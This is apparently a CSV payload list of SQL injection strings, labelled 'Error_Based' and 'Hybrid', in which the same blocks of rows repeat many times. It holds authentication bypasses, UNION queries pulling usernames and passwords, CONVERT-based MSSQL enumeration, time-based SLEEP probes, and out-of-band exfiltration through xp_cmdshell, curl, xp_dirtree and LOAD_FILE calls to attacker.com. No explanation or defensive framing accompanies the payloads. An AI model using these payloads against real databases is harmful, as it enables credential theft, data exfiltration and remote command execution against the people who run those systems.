Payload,Tipo
' OR '1'='1,Error_Based
' AND '1'='1,Error_Based
"' UNION SELECT null, null--",Error_Based
"' UNION SELECT username, password FROM users--",Error_Based
"' UNION SELECT null, null, null--",Error_Based
"' AND 1=CONVERT(int, (SELECT @@version))--",Error_Based
"' AND 1=CONVERT(int, (SELECT user_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT db_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT host_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT current_user))--",Error_Based
"' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--",Error_Based
"' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--",Error_Based
' OR '1'='1,Error_Based
' AND '1'='1,Error_Based
"' UNION SELECT null, null--",Error_Based
"' UNION SELECT username, password FROM users--",Error_Based
"' UNION SELECT null, null, null--",Error_Based
"' AND 1=CONVERT(int, (SELECT @@version))--",Error_Based
"' AND 1=CONVERT(int, (SELECT user_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT db_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT host_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT current_user))--",Error_Based
"' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--",Error_Based
"' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--",Error_Based
' OR '1'='1,Error_Based
' AND '1'='1,Error_Based
"' UNION SELECT null, null--",Error_Based
"' UNION SELECT username, password FROM users--",Error_Based
"' UNION SELECT null, null, null--",Error_Based
"' AND 1=CONVERT(int, (SELECT @@version))--",Error_Based
"' AND 1=CONVERT(int, (SELECT user_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT db_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT host_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT current_user))--",Error_Based
"' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--",Error_Based
"' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--",Error_Based
' OR '1'='1,Error_Based
' AND '1'='1,Error_Based
"' UNION SELECT null, null--",Error_Based
"' UNION SELECT username, password FROM users--",Error_Based
"' UNION SELECT null, null, null--",Error_Based
"' AND 1=CONVERT(int, (SELECT @@version))--",Error_Based
"' AND 1=CONVERT(int, (SELECT user_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT db_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT host_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT current_user))--",Error_Based
"' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--",Error_Based
"' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--",Error_Based
' OR '1'='1,Error_Based
' AND '1'='1,Error_Based
"' UNION SELECT null, null--",Error_Based
"' UNION SELECT username, password FROM users--",Error_Based
"' UNION SELECT null, null, null--",Error_Based
"' AND 1=CONVERT(int, (SELECT @@version))--",Error_Based
"' AND 1=CONVERT(int, (SELECT user_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT db_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT host_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT current_user))--",Error_Based
"' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--",Error_Based
"' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--",Error_Based
' OR '1'='1,Error_Based
' AND '1'='1,Error_Based
"' UNION SELECT null, null--",Error_Based
"' UNION SELECT username, password FROM users--",Error_Based
"' UNION SELECT null, null, null--",Error_Based
"' AND 1=CONVERT(int, (SELECT @@version))--",Error_Based
"' AND 1=CONVERT(int, (SELECT user_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT db_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT host_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT current_user))--",Error_Based
"' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--",Error_Based
"' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--",Error_Based
' OR '1'='1,Error_Based
' AND '1'='1,Error_Based
"' UNION SELECT null, null--",Error_Based
"' UNION SELECT username, password FROM users--",Error_Based
"' UNION SELECT null, null, null--",Error_Based
"' AND 1=CONVERT(int, (SELECT @@version))--",Error_Based
"' AND 1=CONVERT(int, (SELECT user_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT db_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT host_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT current_user))--",Error_Based
"' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--",Error_Based
"' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--",Error_Based
' OR '1'='1,Error_Based
' AND '1'='1,Error_Based
"' UNION SELECT null, null--",Error_Based
"' UNION SELECT username, password FROM users--",Error_Based
"' UNION SELECT null, null, null--",Error_Based
"' AND 1=CONVERT(int, (SELECT @@version))--",Error_Based
"' AND 1=CONVERT(int, (SELECT user_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT db_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT host_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT current_user))--",Error_Based
"' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--",Error_Based
"' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--",Error_Based
' OR '1'='1,Error_Based
' AND '1'='1,Error_Based
"' UNION SELECT null, null--",Error_Based
"' UNION SELECT username, password FROM users--",Error_Based
"' UNION SELECT null, null, null--",Error_Based
"' AND 1=CONVERT(int, (SELECT @@version))--",Error_Based
"' AND 1=CONVERT(int, (SELECT user_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT db_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT host_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT current_user))--",Error_Based
"' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--",Error_Based
"' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--",Error_Based
' OR '1'='1,Error_Based
' AND '1'='1,Error_Based
"' UNION SELECT null, null--",Error_Based
"' UNION SELECT username, password FROM users--",Error_Based
"' UNION SELECT null, null, null--",Error_Based
"' AND 1=CONVERT(int, (SELECT @@version))--",Error_Based
"' AND 1=CONVERT(int, (SELECT user_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT db_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT host_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT current_user))--",Error_Based
"' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--",Error_Based
"' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--",Error_Based
' OR '1'='1,Error_Based
' AND '1'='1,Error_Based
"' UNION SELECT null, null--",Error_Based
"' UNION SELECT username, password FROM users--",Error_Based
"' UNION SELECT null, null, null--",Error_Based
"' AND 1=CONVERT(int, (SELECT @@version))--",Error_Based
"' AND 1=CONVERT(int, (SELECT user_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT db_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT host_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT current_user))--",Error_Based
"' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--",Error_Based
"' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--",Error_Based
' OR '1'='1,Error_Based
' AND '1'='1,Error_Based
"' UNION SELECT null, null--",Error_Based
"' UNION SELECT username, password FROM users--",Error_Based
"' UNION SELECT null, null, null--",Error_Based
"' AND 1=CONVERT(int, (SELECT @@version))--",Error_Based
"' AND 1=CONVERT(int, (SELECT user_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT db_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT host_name()))--",Error_Based
"' AND 1=CONVERT(int, (SELECT current_user))--",Error_Based
"' AND 1=CONVERT(int, (SELECT SYSTEM_USER))--",Error_Based
"' AND 1=CONVERT(int, (SELECT IS_SRVROLEMEMBER('sysadmin')))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysdatabases))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='U'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='P'))--",Error_Based
"' AND 1=CONVERT(int, (SELECT COUNT(*) FROM master..sysobjects WHERE xtype='V'))--",Error_Based
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",Hybrid
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",Hybrid
"' UNION SELECT username, password FROM users WHERE '1'='1'--",Hybrid
'; EXEC xp_cmdshell('nslookup attacker.com')--,Hybrid
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\file')--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='curl http://attacker.com/?data=leak'; EXEC(@cmd);--,Hybrid
"' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",Hybrid
"' AND IF(1=1,SLEEP(5),0)--",Hybrid
"' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",Hybrid
"' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",Hybrid
"' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Hybrid
'; EXEC xp_fileexist '\\attacker.com\check'--,Hybrid
'; EXEC master..xp_dirtree '\\attacker.com\leak'--,Hybrid
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",Hybrid
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,Hybrid
